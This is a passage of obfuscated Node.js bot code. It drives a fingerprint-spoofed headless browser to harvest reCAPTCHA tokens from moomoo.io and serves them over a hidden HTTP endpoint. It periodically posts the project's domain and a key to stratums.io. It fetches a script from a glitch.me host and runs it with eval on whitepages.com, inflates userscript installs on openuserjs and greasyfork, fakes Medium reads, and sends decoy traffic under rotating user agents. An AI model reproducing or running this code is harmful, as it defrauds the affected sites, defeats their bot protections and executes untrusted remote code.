      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x7)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + W(0xd, '8S7Q') + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + Y(0x1) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + X(0x8) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + Y(0xb) + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + Y(0x9) + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + X(0x4) + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + X(0x5) + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x78 * -0x4f + 0xb * 0xd1 + 0x1 * -0x2e03
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x23 + -0x1155 + -0x158 * -0xd)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1d31 + 0xbfa + -0x28c7 * 0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x20f4 + -0x842 + -0x3 * 0x81a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const Z = c,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2ad + -0x26af + 0x2402;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u[Z(0xe)](), await r['close'](), await q();
          for (let w = -0x25 * 0x85 + 0x6 * -0x3f2 + 0x2ae5; w < getRandomInt(0xc2b + -0xe * -0x22a + -0x2a76, 0x1c9 + 0x14f6 + 0x16ba * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2aa6 + 0x1535c + -0x93a2);
        }
      }();
    }, 0xef * -0x7 + 0x24ec + -0x1dff), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2136 + 0x869 * -0x2 + 0x1 * 0x3208;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x609 * -0x3 + -0x206c + 0xa1b * 0x5, -0x247a + -0x8 * -0x4b8 + -0x114)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2 * -0x7033 + 0x25 * 0x30d + -0xe4b5 * -0x1);
    }, 0x15ec * -0x1 + -0x4 * -0x44f + 0xa * 0x82), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x407 * 0x9 + -0x315 + 0x2754;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * 0x1fb5 + 0x58 * 0x7 + 0x31 * -0x75), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * 0x1463 + -0x149 * 0xa + -0x789 * 0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1647a8 + 0x7ed28 + -0x4a2 * -0x610);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x2 * -0xcbb + -0x10d9 + -0x283 * -0x11);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xe2 * 0x16 + -0xe15 + 0x1 * -0x48f);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x95a * -0x2 + 0x1 * -0x8d7 + -0x37 * -0x65);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const a0 = b,
          A = j['random']();
        return [
          A,
          A['includes'](a0(0xa, 'TIW%'))
        ];
      }()),
      v = function(A, B = -0x1 * 0x13e3 + -0x1a * -0x158 + -0xf0c) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x2047 * -0x1 + 0x877 * 0x2 + -0x3134));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x412 * 0x5 + -0xbc * -0x2a + 0x1999 * -0x2, D['indexOf']('\x20'));
        return B ? E['slice'](0xbf5 * -0x2 + -0x11e + 0x1908, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1a6a + -0x5 * 0x8b + 0xf5d),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4ced * -0x1 + -0x25b * -0x1e + 0x2d53),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x3 * 0x7ab + 0x1 * -0x1a72 + 0x371; k < -0x63b + -0xdcb + 0x36 * 0x5f; k++)
    setTimeout(f, (0x58a4 + 0xfc43 * -0x1 + -0x1 * -0x18dff) * k * getRandomInt(0x7a1 + -0x25b4 + -0xf0a * -0x2, 0x69c + -0xb96 * 0x3 + 0x1c29));
  setInterval(() => {
    f();
    for (let l = -0x11b8 + 0x20a1 * -0x1 + 0x3259; l < -0x51 * -0x46 + -0x1 * 0x77 + -0x15ab; l++)
      setTimeout(f, (-0x1bc21 + 0x1 * 0x497c + 0x25d05) * l * getRandomInt(-0x1 * -0x1cd5 + 0x91 * -0x2 + -0x5 * 0x58a, -0x23ea + -0x1fe9 + 0x43d6));
  }, 0x2c8b83 + 0x2f5de * 0xf + -0x220505);
})()), doFlags['doMiscNetA' + W(0x6, '6aYp')] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
